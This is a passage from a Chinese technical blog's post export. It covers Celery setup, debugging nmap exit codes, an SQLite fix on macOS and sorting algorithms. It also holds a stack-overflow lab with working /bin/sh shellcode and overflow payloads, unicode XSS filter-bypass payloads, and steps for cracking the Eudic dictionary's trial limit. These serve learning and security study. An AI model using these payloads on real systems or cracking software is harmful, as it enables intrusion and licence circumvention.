exchange=Exchange('feed'), routing_key='feed.#'), Queue('eat', exchange=Exchange('eat'), routing_key='eat.#'))# routing# http://docs.celeryproject.org/en/latest/userguide/routing.htmltask_routes = &#123; 'proj.tasks.feeddog': &#123;'queue': 'feed'&#125;, 'proj.tasks.eat': &#123;'queue': 'eat'&#125;&#125;# beat schedule# http://docs.celeryproject.org/en/master/userguide/periodic-tasks.html#beat-entriesbeat_schedule = &#123; 'do-nmap-scan-60-seconds': &#123; # scheduler task name 'task': 'proj.tasks.feeddog', # special task name with project name 'schedule': timedelta(seconds=60), #'args': () 'options': &#123; 'queue': 'feed_scan' # task to specific queue &#125; &#125;&#125; Run: 123456# 分布式端点celery worker -A eyes.app -l info -Q feed# 中心celery worker -A eyes.app -l info -Q eat # 中心celery beat -A eyes.app -l info 在上面的自动调度方案中，是通过在配置文件中设置调度的相关参数，除了这种方式外还可以在代码里面设置，这种方式控制的粒度更为精细 12345678# @app.on_after_configure.connect not work@app.on_after_finalize.connectdef setup_periodic_tasks(sender, **kwargs): sender.add_periodic_task( 60, feeddog.s(), name='feed-dog-every-60-seconds' ) 工作流(canvas)子任务：也可以视为一种任务，但如果把任务视为函数的话，它可能是填了部分参数的函数。子任务的主要价值在于它可以用于关联运算中，即几个子任务按某种工作流方式的定义执行更为复杂的任务。 Celery工作流包含以下原语： group group并行的执行一系列任务： 12345from celery import groupfrom proj.tasks import addgroup(add.s(i, i) for i in xrange(10))().get()# [0, 2, 4, 6, 8, 10, 12, 14, 16, 18] chain chain串行的执行任务： 12345from celery import chainfrom proj.tasks import add, mulchain(add.s(4, 4) | mul.s(8))().get()# (4 + 4) * 8 chord chord是包含回调的group操作 map starmap chunks backend 使用rabbitmqCelery 4.0以后backend使用rabbitmq推荐使用rpc， RPC Result Backend有如下特点： 默认不持久化, 可以通过配置 result_persistent来配置持久化 优势在于可以实时的获取状态变化，而不用客户端去轮询的获取 缺点: 只能被检索一次，如果您有两个进程等待相同的结果，其中一个进程将永远不会收到结果 worker 后台运行celery multi命令在后台启动一个或多个worker。 123456celery multi start w1 -A proj -l infocelery multi start w1 -A proj -l info --pidfile=/var/run/celery/%n.pid \ --logfile=/var/log/celery/%n%I.logcelery multi restart w1 -A proj -l infocelery multi stop w1 -A proj -l infocelery multi stopwait w1 -A proj -l info supervidor celery.ini 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950[group:test_celery]programs = test_celery.async,test_celery.beat[program:test_celery.async]command=/data/test.celery/env/bin/celery worker -A proj.app --loglevel=info -Q test_celery_queuenumprocs=1numprocs_start=0priority=999autostart=truestartsecs=3startretries=3exitcodes=0,2stopsignal=QUITstopwaitsecs=60directory=/data/test.celeryuser=www-datastopasgroup=falsekillasgroup=falseredirect_stderr=truestdout_logfile=/data/log/test.celery/test_celery.logstdout_logfile_maxbytes=250MBstdout_logfile_backups=10stderr_logfile=/data/log/test.celery/test_celery.errstderr_logfile_maxbytes=250MBstderr_logfile_backups=10environment=PYTHONPATH=&apos;/data/test.celery/&apos;;C_FORCE_ROOT=&quot;true&quot;[program:test_celery.beat]command=/data/test.celery/env/bin/celery beat -A proj.app --loglevel=infonumprocs=1numprocs_start=0priority=999autostart=truestartsecs=3startretries=3exitcodes=0,2stopsignal=QUITstopwaitsecs=60directory=/data/test.celeryuser=www-datastopasgroup=falsekillasgroup=falseredirect_stderr=truestdout_logfile=/data/log/test.celery/test_celery.beat.logstdout_logfile_maxbytes=250MBstdout_logfile_backups=10stderr_logfile=/data/log/test.celery/test_celery.beat.errstderr_logfile_maxbytes=250MBstderr_logfile_backups=10environment=PYTHONPATH=&apos;/data/test.celery/&apos;;C_FORCE_ROOT=&quot;true&quot; 简单说明 test_celery.async 和 test_celery.beat 是两个program，分别对应worker和beat，而它们又同属于 test_celery 这个组，这样便于同时管理。 environment 下设置 PYTHONPATH Ref http://blog.csdn.net/libing_thinking/article/details/78566208]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>celery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【develop】nmap exit code 255]]></title>
    <url>%2F2017%2F11%2F30%2F%E3%80%90develop%E3%80%91nmap-exit-code-255%2F</url>
    <content type="text"><![CDATA[使用python subprocess模块调用namp程序竟然返回255错误代码，如下所示: 1234567891011121314In [4]: subprocess.check_output(['nmap'])---------------------------------------------------------------------------CalledProcessError Traceback (most recent call last)&lt;ipython-input-4-3ea255c65d35&gt; in &lt;module&gt;()----&gt; 1 subprocess.check_output(['nmap'])/usr/local/Cellar/python/2.7.14/Frameworks/Python.framework/Versions/2.7/lib/python2.7/subprocess.pyc in check_output(*popenargs, **kwargs) 217 if cmd is None: 218 cmd = popenargs[0]--&gt; 219 raise CalledProcessError(retcode, cmd, output=output) 220 return output 221CalledProcessError: Command '['nmap']' returned non-zero exit status 255 查看nmap在线文档https://nmap.org/book/ncat-man-exit-code.html，返回码只有0, 1, 2三种，并没有提及255这个返回码，而且一般程序设计不会返回255这样的数字。于是只好查看nmap源码了。在nmap源码文件nmap.cc的nmap_main函数里面有大量返回码，包括: -1, 0, 1, 2。而不是只有文档中所描述的三种返回码。当nmap不带任何参数调用时，返回-1，也就是python显示的返回码255。-1和255有没有想到些什么，-1的补码就是255，难道程序的返回码做了类型转换，带着这个疑问，实验验证如下： 实验验证编写c程序如下: 123456#include &lt;stdio.h&gt;int main()&#123; printf("return -1"); return -1;&#125; 编译运行如下： 12▶ ./testreturn -1% pyhon调用验证，显示返回状态为255，也就是-1的unsigned形式, 而不是直接显示-1的返回码。 1234567891011121314In [2]: subprocess.check_output('./test')---------------------------------------------------------------------------CalledProcessError Traceback (most recent call last)&lt;ipython-input-2-20f1d6c2bb80&gt; in &lt;module&gt;()----&gt; 1 subprocess.check_output('./test')/usr/local/Cellar/python/2.7.14/Frameworks/Python.framework/Versions/2.7/lib/python2.7/subprocess.pyc in check_output(*popenargs, **kwargs) 217 if cmd is None: 218 cmd = popenargs[0]--&gt; 219 raise CalledProcessError(retcode, cmd, output=output) 220 return output 221CalledProcessError: Command './test' returned non-zero exit status 255 那么，python为什么不直接输出程序的返回码，而转成了正整数呢？参考：https://docs.python.org/2/library/subprocess.html#subprocess.Popen.returncode 返回码为负数是有特殊含义的，-N表明子程序是被信号N所终止的。]]></content>
      <categories>
        <category>develop</category>
      </categories>
      <tags>
        <tag>nmap</tag>
        <tag>subprocess</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【Mac】解决ipython使用sqlite3报错问题]]></title>
    <url>%2F2017%2F11%2F30%2F%E3%80%90Mac%E3%80%91%E8%A7%A3%E5%86%B3ipython%E4%BD%BF%E7%94%A8sqlite3%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[在pycharm上调试程序使用其自带python控制台，查看变量属性或做些简单的计算，出现报错如下： 1self.ipython.history_manager.save_thread.pydev_do_not_trace = True #don&apos;t trace ipython history saving thread python是brew安装的python 2.7.14版本，并安装了ipython==5.4.10, 乍一看是ipython的问题，第一感觉是ipython和pycharm不兼容，以为是ipython版本太高了导致不兼容，以前有出现过这样的问题。试了其他ipython版本，发现还是报错，那就不是ipython版本问题。 于是命令行打开ipython, 提示警告如下： 12/usr/local/lib/python2.7/site-packages/IPython/core/history.py:228: UserWarning: IPython History requires SQLite, your history will not be saved warn(&quot;IPython History requires SQLite, your history will not be saved&quot;) 也就是ipython不能使用sqlite来存储历史记录，应该是sqlite和 python的锅了，在linux上要先装sqlite3,再装python,以便python能使用sqlite接口。尝试import sqlite3，看看是否是这个问题，出现报错如下： 1234ImportError: dlopen(/usr/local/Cellar/python/2.7.14/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_sqlite3.so, 2): Symbol not found: _sqlite3_enable_load_extension Referenced from: /usr/local/Cellar/python/2.7.14/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_sqlite3.so Expected in: /usr/lib/libsqlite3.dylib in /usr/local/Cellar/python/2.7.14/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_sqlite3.so 果然是导入错误，问题明确了，google一番：https://stackoverflow.com/questions/41994449/symbol-not-found-sqlite3-enable-load-extension-sqlite-installed-via-homebrew 解决方案如下： brew install sqlite or brew reinstall sqlite 1234567891011his formula is keg-only, which means it was not symlinked into /usr/local,because macOS provides an older sqlite3.If you need to have this software first in your PATH run: echo &apos;export PATH=&quot;/usr/local/opt/sqlite/bin:$PATH&quot;&apos; &gt;&gt; ~/.zshrcFor compilers to find this software you may need to set: LDFLAGS: -L/usr/local/opt/sqlite/lib CPPFLAGS: -I/usr/local/opt/sqlite/includeFor pkg-config to find this software you may need to set: PKG_CONFIG_PATH: /usr/local/opt/sqlite/lib/pkgconfig vim .zshrc, 添加如下内容 12345#sqliteexport PATH=&quot;/usr/local/opt/sqlite/bin:$PATH&quot;LDFLAGS=&quot;-L/usr/local/opt/sqlite/lib&quot;CPPFLAGS=&quot;-I/usr/local/opt/sqlite/include&quot;export PKG_CONFIG_PATH=&quot;/usr/local/opt/sqlite/lib/pkgconfig&quot; source .zshrc 问题解决，ipython, pycharm均没问题。]]></content>
      <categories>
        <category>solution</category>
      </categories>
      <tags>
        <tag>MAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[破解MAC版欧陆词典3.6.8]]></title>
    <url>%2F2017%2F11%2F06%2F%E3%80%90%E7%A0%B4%E8%A7%A3%E3%80%91MAC%E7%89%88%E6%AC%A7%E9%99%86%E8%AF%8D%E5%85%B83-6-8%2F</url>
    <content type="text"><![CDATA[欧陆词典3.6.8版本破解，只需改com.eusoft.eudic.plist文件(/users/用户名/Library/Preferences/com.eusoft.eudic.plist)中的MAIN_TimesLeft为820711即可。 官网下载最新版欧陆词典并安装 打开欧陆词典后，退出欧陆词典 使用xcode打开com.eusoft.eudic.plist文件，修改剩余次数 修改属性值后关闭文件，修改当前用户属性并设置锁住 重启电脑，在打开欧陆词典]]></content>
      <categories>
        <category>破解</category>
      </categories>
      <tags>
        <tag>MAC</tag>
        <tag>破解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【实验】linux x64栈溢出]]></title>
    <url>%2F2017%2F10%2F11%2F%E3%80%90%E5%AE%9E%E9%AA%8C%E3%80%91linux-x64%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[这篇文章主要记录基于64位linux的栈溢出实验，在实验过程中遇到的问题，以及自己的一些思考。 环境配置实验基于Ubuntu 16.04, 操作系统版本以及gcc, gdb版本信息如下: 12345Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x8664 x8664 x86_64 GNU/Linuxgcc (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1 为了更简单的方式实现栈溢出，需要关闭一些保护措施。 ASLR(地址空间布局随机化) 关闭ASLR：sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot; Cannary 开启Canary之后，函数开始时在ebp和临时变量之间插入一个随机值，函数结束时验证这个值。如果不相等（也就是这个值被其他值覆盖了），就会调用 _stackchk_fail函数，终止进程。对应GCC编译选项-fno-stack-protector解除该保护。 NX.开启NX保护之后，程序的堆栈将会不可执行。对应GCC编译选项-z execstack解除该保护。 GCC 与gdb版本问题gcc从4.8开始缺省使用了-gdwarf-4选项，较旧的gdb无法识别dwarf4版本的调试信息, 参见https://gcc.gnu.org/gcc-4.8/changes.html。用gcc编译程序时，使用选项-gdwarf-3来指定生成dwarf3版本的调试信息，这样旧版的gdb就可以识别调试信息了。 综合上述信息，使用gcc编译，应当使用如下命令: 1gcc -fno-stack-protector -z execstack -gdwarf-3 xxx.c -o xxx 编写shellcode对栈溢出的利用，通常是覆盖返回地址，指向自shellcode的地址，从而执行shellcode。因此，这里先解决shellcode的编写问题。参考：https://www.exploit-db.com/exploits/36858/。首先编写汇编文件，验证shellcode功能，然后再提取机器码。使用AT&amp;T风格编写汇编文件如下： 12345678910111213.global _start_start: xor %esi, %esi # /bin//sh movabs $0x68732f2f6e69622f, %rbx push %rsi push %rbx push %rsp pop %rdi pushq $59 pop %rax xor %edx, %edx syscall 提取机器码: 12for i in $(objdump -d tmp | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05 编写栈溢出程序12345678910111213#include&lt;stdio.h&gt;#include&lt;string.h&gt;void overflow(char* str)&#123; char buf[128]; strcpy(buf, str);&#125;int main()&#123; char str[256]="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05 AAAAAAAA"; overflow(str); return 0;&#125; 上面这段程序栈溢出漏洞触发点在strcpy函数, 函数没有做边界检查，可导致栈溢出覆盖返回地址。成功利用栈溢出需要确定覆盖多少个字节可以覆盖到返回地址，另外就是确定shellcode的地址即str的首地址，让返回地址指向该地址。 123456789101112131415161718192021$gcc -fno-stack-protector -z execstack -gdwarf-3 pwn.c -o pwn$gdb pwn(gdb) startTemporary breakpoint 1, main () at pwn.c:1010 char str[256]="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05 AAAAAAAA";(gdb) p /x $rsp$4 = 0x7fffffffdc10(gdb) p /x $rbp$5 = 0x7fffffffdd10 # rbp rsp相差0x100, 即256,正是str申请的空间大小(gdb) p /x &amp;str$3 = 0x7fffffffdc10 # str首地址(gdb) s11 overflow(str);(gdb) soverflow (str=0x7fffffffdc10 "1\366H\273/bin//shVST_j;X1\322\017\005 AAAAAAAA") at pwn.c:66 strcpy(buf, str);(gdb) p /x &amp;buf$7 = 0x7fffffffdb80(gdb) p /x $rbp$8 = 0x7fffffffdc00 # 0x7fffffffdc00 - 0x7fffffffdb80 = 128，即buf申请的空间大小 使用的shellcode长度为23字节，为了覆盖到返回地址，需要128+8(ebp)=136字节，则除了shellcode外还需要136-23=113填充字节。另外返回地址为0x7fffffffdd10,改为小端模式\x10\xdc\xff\xff\xff\x7f。那么payload为 1char str[256]="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\xdc\xff\xff\xff\x7f"; 编译后运行程序，出现段错误，不符合预期，于是gdb调试。 1234567891011121314151617181920212223242526272829303132333435363738$ ./pwn段错误 (核心已转储)(gdb) soverflow ( str=0x7fffffffdc10 "1\366H\273/bin//shVST_j;X1\322\017\005 ", 'A' &lt;repeats 112 times&gt;, "\020\334\377\377\377\177") at pwn.c:66 strcpy(buf, str);(gdb) n7 &#125;(gdb) sWarning:Cannot insert breakpoint 0.Cannot access memory at address 0x6e69622fbb48f6310x00007fffffffdc10 in ?? ()(gdb) p /x $rsp$1 = 0x7fffffffdc10(gdb) p /x $rbp$2 = 0x4141414141414141(gdb) p /x $rip$3 = 0x7fffffffdc10(gdb) x/32xg $rsp-0x100x7fffffffdc00: 0x4141414141414141 0x00007fffffffdc100x7fffffffdc10: 0x6e69622fbb48f631 0x5f54535668732f2f0x7fffffffdc20: 0x20050fd231583b6a 0x41414141414141410x7fffffffdc30: 0x4141414141414141 0x41414141414141410x7fffffffdc40: 0x4141414141414141 0x41414141414141410x7fffffffdc50: 0x4141414141414141 0x41414141414141410x7fffffffdc60: 0x4141414141414141 0x41414141414141410x7fffffffdc70: 0x4141414141414141 0x41414141414141410x7fffffffdc80: 0x4141414141414141 0x41414141414141410x7fffffffdc90: 0x4141414141414141 0x00007fffffffdc100x7fffffffdca0: 0x0000000000000000 0x00000000000000000x7fffffffdcb0: 0x0000000000000000 0x00000000000000000x7fffffffdcc0: 0x0000000000000000 0x00000000000000000x7fffffffdcd0: 0x0000000000000000 0x00000000000000000x7fffffffdce0: 0x0000000000000000 0x00000000000000000x7fffffffdcf0: 0x0000000000000000 0x0000000000000000 gdb查看rip, rsp, rbp都是正确的，然而实际运行却是段错误，网上搜索一番，原来是gdb有自己的变量环境，变量的存放地址和程序实际运行会不一致，既然找到原因了，解决起来就比较容易了，只需要把返回地址改为shellcode实际存放的地址即可，填充长度无须改变，因为相对偏移不变。 一种方案是修改源程序，打印出str的首地址：printf(&quot;%p\n&quot;, str);;另外一种方案是利用内核转储获取真实内存地址，无须改变源码。 GDB获取真实内存地址首先启用内核转储：ulimit -c unlimited。该方法只在当前shell中生效，永久生效可以修改/etc/profile, 添加：ulimit -c unlimited。缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。 1gdb &lt;程序可执行文件&gt; &lt;coredump转储文件&gt; 1234567891011$ulimit -c unlimited$ ./pwn段错误 (核心已转储)$ gdb pwn coreType "apropos word" to search for commands related to "word"...Reading symbols from pwn...done.[New LWP 11347]Core was generated by `./pwn'.Program terminated with signal SIGSEGV, Segmentation fault.#0 0x00007fffffffdc10 in ?? () 从上图可以看出shellcode地址，修改payload为: 1char str[256]="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x40\xdc\xff\xff\xff\x7f"; 重新编译运行。 参考 https://www.exploit-db.com/docs/33698.pdf Linux 64-bit Buffer Overflow Tutorial Where does Shellcode come from]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基本排序算法]]></title>
    <url>%2F2017%2F09%2F30%2F%E5%9F%BA%E6%9C%AC%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[冒泡排序 稳定排序, 时间复杂度: O(N^2) 冒泡排序(Bubble Sort)，又被称为气泡排序或泡沫排序，它会遍历若干次要排序的数列，每次遍历时，它都会从前往后依次的比较相邻两个数的大小；如果前者比后者大，则交换它们的位置。这样，一次遍历之后，最大的元素就在数列的末尾！ 二次遍历时，第二大的元素就被排列在最大元素之前。N次遍历整个数列都有序。 123456789def bubble_sort(lists): cnt = len(lists) for i in range(cnt): # 比较序列递减 for j in range(1, cnt-i): if lists[j-1] &gt; lists[j]: #swap lists[j-1], lists[j] = lists[j], lists[j-1] return lists 选择排序 稳定排序, 时间复杂度: O(N^2) 选择排序(Selection sort)是一种简单直观的排序算法，基本思想是：首先在未排序的数列中找到最小(or最大)元素，然后将其存放到数列的起始位置；接着，再从剩余未排序的元素中继续寻找最小(or最大)元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕 123456789def select_sort(lists): cnt = len(lists) for i in range(cnt): # 比较序列递减 for j in range(i+1, cnt): if lists[i] &gt; lists[j]: #swap lists[i], lists[j] = lists[j], lists[i] return lists 直接插入排序 稳定排序, 时间复杂度: O(N^2) 直接插入排序(Straight Insertion Sort)的基本思想是：把n个待排序的元素看成为一个有序表和一个无序表。开始时有序表中只包含1个元素，无序表中包含有n-1个元素，排序过程中每次从无序表中取出第一个元素，将它插入到有序表中的适当位置，使之成为新的有序表，重复n-1次可完成排序过程 数据后移 123456789def insert_sort(lists): for i in range(1, len(lists)): j = i-1 tmp = lists[i] while lists[j]&gt;tmp and j&gt;=0: lists[j+1] = lists[j] j -= 1 lists[j+1] = tmp return lists 数据交换 12345678def insert_sort(lists): for i in range(1, len(lists)): j = i-1 while lists[j]&gt;lists[j+1] and j&gt;=0: # swap lists[j+1], lists[j] = lists[j], lists[j+1] j -= 1 return lists 希尔排序 不稳定排序， 时间复杂度: O(N^(3/2)) 希尔排序(Shell Sort)是插入排序的一种，它是针对直接插入排序算法的改进。该方法又称缩小增量排序，因DL．Shell于1959年提出而得名。 希尔排序实质上是一种分组插入方法。它的基本思想是：对于n个待排序的数列，取一个小于n的整数gap(gap被称为步长)将待排序元素分成若干个组子序列，所有距离为gap的倍数的记录放在同一个组中；然后，对各组内的元素进行直接插入排序。 这一趟排序完成之后，每一个组的元素都是有序的。然后减小gap的值，并重复执行上述的分组和排序。重复这样的操作，当gap=1时，整个数列就是有序的。 123456789101112def shell_sort(lists): gap = len(lists) / 2 while gap &gt; 0: for i in range(gap, len(lists)): # 同组直接插入排序 j = i - gap while lists[j] &gt; lists[j+gap] and j&gt;=0: # swap lists[j+gap], lists[j] = lists[j], lists[j+gap] j -= gap gap /= 2 return lists 归并排序 稳定排序, 时间复杂度: O(NlogN) 将两个的有序数列合并成一个有序数列，我们称之为”归并“。归并排序(Merge Sort)就是利用归并思想对数列进行排序。 12345678910111213141516171819202122def merge(left, right): res = [] i, j = 0, 0 while i&lt;len(left) and j&lt;len(right): if left[i]&lt;right[j]: res.append(left[i]) i += 1 else: res.append(right[j]) j += 1 res.extend(left[i:]) res.extend(right[j:]) return resdef merge_sort(lists): lens = len(lists) if lens &lt;= 1: return lists num = lens / 2 left = merge_sort(lists[:num]) right = merge_sort(lists[num:]) return merge(left, right) 快速排序 不稳定排序，时间复杂度: O(NlogN) 快速排序(Quick Sort)使用分治法策略，它的基本思想是：选择一个基准数，通过一趟排序将要排序的数据分割成独立的两部分；其中一部分的所有数据都比另外一部分的所有数据都要小。然后，再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。 快速排序流程：(1) 从数列中挑出一个基准值。(2) 将所有比基准值小的摆放在基准前面，所有比基准值大的摆在基准的后面(相同的数可以到任一边)；在这个分区退出之后，该基准就处于数列的中间位置。(3) 递归地把”基准值前面的子数列”和”基准值后面的子数列”进行排序。 12345678910111213141516171819def quick_sort(lists, l, r): if l &gt;= r: return lists key = lists[l] low = l high = r while l &lt; r: while l&lt;r and lists[r] &gt;= key: r -= 1 lists[l] = lists[r] while l&lt;r and lists[l] &lt; key: l += 1 lists[r] = lists[l] lists[l] = key quick_sort(lists, low, l-1) quick_sort(lists, l+1, high) return lists 基数排序 稳定排序, 时间复杂度: O(N) 基数排序(Radix Sort)是桶排序的扩展，它的基本思想是：将整数按位数切割成不同的数字，然后按每个位数分别比较。具体做法是：将所有待比较数值统一为同样的数位长度，数位较短的数前面补零。然后，从最低位开始，依次进行一次排序。这样从最低位排序一直到最高位排序完成以后, 数列就变成一个有序序列。 1234567891011121314import mathdef radix_sort(lists, radix=10): k = int(math.ceil(math.log(max(lists), radix))) bucket = [[] for i in range(radix)] for i in range(k): for j in lists: bucket[j/(radix**(i)) % radix].append(j) del lists[:] for z in bucket: lists.extend(z) del z[:] return lists 堆排序 不稳定排序，时间复杂度: O(NlogN) 堆排序(Heap Sort)是指利用堆这种数据结构所设计的一种排序算法。最大堆通常被用来进行”升序”排序，而最小堆通常被用来进行”降序”排序。 最大堆进行升序排序的基本思想：① 初始化堆：将数列a[1…n]构造成最大堆。② 交换数据：将a[1]和a[n]交换，使a[n]是a[1…n]中的最大值；然后将a[1…n-1]重新调整为最大堆。 接着，将a[1]和a[n-1]交换，使a[n-1]是a[1…n-1]中的最大值；然后将a[1…n-2]重新调整为最大值。 依次类推，直到整个数列都是有序的。 “数组实现的二叉堆的性质”,在第一个元素的索引为 0 的情形中：性质一：索引为i的左孩子的索引是 (2i+1);性质二：索引为i的左孩子的索引是 (2i+2);性质三：索引为i的父结点的索引是 floor((i-1)/2); 123456789101112131415161718192021222324def adjust_heap(lists, i, size): lchild = 2 * i + 1 rchild = 2 * i + 2 max = i if i &lt; size / 2: if lchild &lt; size and lists[lchild] &gt; lists[max]: max = lchild if rchild &lt; size and lists[rchild] &gt; lists[max]: max = rchild if max != i: lists[max], lists[i] = lists[i], lists[max] adjust_heap(lists, max, size) def build_heap(lists, size): for i in range(size/2-1, -1, -1): adjust_heap(lists, i, size) def heap_sort(lists): size = len(lists) build_heap(lists, size) for i in range(size-1, -1, -1): lists[0], lists[i] = lists[i], lists[0] adjust_heap(lists, 0, i) return lists]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[unicode绕过xss]]></title>
    <url>%2F2017%2F08%2F07%2Funicode%E7%BB%95%E8%BF%87xss%2F</url>
    <content type="text"><![CDATA[无意间看到一篇讲解unicode绕过xss的文章Xssing Web With Unicodes，内容比较基础，记录下，顺便巩固下unicode的相关知识:) unicode基础知识简单来说，unicode 是字符集，utf-8,utf-16,utf-32是编码规则。unicode 字符集: ttps://unicode-table.com/ UTF-8 (1-4 byte)utf-8是可变变长编码，将一个unicode码位编码成1-4字节。 1234U+ 0000 ~ U+ 007F: 0XXXXXXXU+ 0080 ~ U+ 07FF: 110XXXXX 10XXXXXXU+ 0800 ~ U+ FFFF: 1110XXXX 10XXXXXX 10XXXXXXU+10000 ~ U+1FFFF: 11110XXX 10XXXXXX 10XXXXXX 10XXXXXX Example : Character “A” =&gt; 0x41 Character “ſ” =&gt; 0xC4 0xBF Character “ಓ” =&gt; 0xE0 0xB2 0x93 Character “𪨶” =&gt; 0xF0 0xAA 0xA8 0xB6 例如 “ſ”查unicode字符集为 \u+017f 1230000 0001 0111 1111 &lt;- unicode 二进制110+00100 10+111111 &lt;- utf-8 编码(二进制)，对应上面第二行1100 0100 1011 1111 &lt;- 0Xc4 0xbf 在线unicode转utf-8工具: http://www.ltg.ed.ac.uk/~richard/utf-8.cgi?input=017f&amp;mode=hex UTF-16 (2byte) UTF-16be (be- Big Endian) [Left to Right Byte Order ] Example : Character “A” =&gt; 0x00 0x41 UTF-16le (le- Little Endian) [Right to Left Byte Order] Example : Character “A” =&gt; 0x41 0x00 UTF-32 (4 byte) UTF-32be (be- Big Endian) [Left to Right Byte Order] Example : Character “A” =&gt; 0x00 0x00 0x00 0x41 UTF-32le (le- Little Endian) [Right to Left Byte Order] Example : Character “A” =&gt; 0x41 0x00 0x00 0x00 unicode绕过简单编码绕过 :http://rakeshmane.com/lab/unicode/xss.php?x=payload&amp;charset=utf-8 12345678&lt;?phpheader('X-XSS-Protection: 0');header('Content-Type: text/html; charset='.$_GET['charset']);highlight_string(file_get_contents(__FILE__, true));$x=$_GET['x'];$x=preg_replace('/&lt;\w+/', '', $x);echo $x;?&gt; 这个比较简单，设置字符集为 utf-16 或 utf-32可以绕过preg_replace检测 设置编码为utf-16大端模式: x=%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00&amp;charset=utf-16be 设置编码为utf-32 x=%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E&amp;charset=UTF-32 看paylaod可以发现 最前面多了一个 %00，UTF-32是4字节编码，”&lt;”编码为”%00%00%00%3C”, 前面多加的一个 %00, 是为了匹配服务器返回的页面内容为4的整数倍，这样浏览器通过utf-32编码页面内容才能正确渲染提供的payload,触发xss,实际情况需要添加多少个 %00 来满足4的整数倍，视具体情况而定。 当没有指定编码模式(大端，小端)时，默认情况下UTF-32为大端模式，UTF-16为小端模式。 滥用unicode映射有些应用为了更好的兼容性，将unicode字符映射为大写或小写英文字母，作则给了一段nodejs代码去获取这些映射关系。 1234567891011highNumber=65000;for(i=0;i&lt;highNumber;i++)&#123; x="" y="" if("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"/?&gt;&lt;';:.,|\\+=-_*&amp;^%$#@!~`".includes(String.fromCharCode(i).toLowerCase())) x=String.fromCharCode(i).toLowerCase() if("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"/?&gt;&lt;';:.,|\\+=-_*&amp;^%$#@!~`".includes(String.fromCharCode(i).toUpperCase())) y=String.fromCharCode(i).toUpperCase() if((x!=""||y!="")&amp;&amp;!("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"/?&gt;&lt;';:.,|\\+=-_*&amp;^%$#@!~`".includes(String.fromCharCode(i)))) console.log(" "+i+" Original : "+String.fromCharCode(i)+" [\\u"+(i).toString(16)+"] LowerCase : "+x+" UpperCase : "+y)&#125; 得到如下结果: 12345305 Original : ı [\u131] LowerCase : UpperCase : I383 Original : ſ [\u17f] LowerCase : UpperCase : S8490 Original : K [\u212a] LowerCase : k UpperCase :64261 Original : ﬅ [\ufb05] LowerCase : UpperCase : ST64262 Original : ﬆ [\ufb06] LowerCase : UpperCase : ST demo 1234567891011121314&lt;?phpheader('Content-Type: text/html; charset=UTF-8');header('X-XSS-Protection: 0');?&gt;&lt;meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self';"&gt;&lt;?phphighlight_string(file_get_contents(__FILE__, true));$x=$_GET['x'];$x=str_ireplace('$','',$x); // Use it to bypass WAF,I know it's annoying but I can't disable it :P$x=str_ireplace('&lt;script','BLOCKED',$x);$x = mb_convert_case($x, MB_CASE_UPPER);echo $x;?&gt; 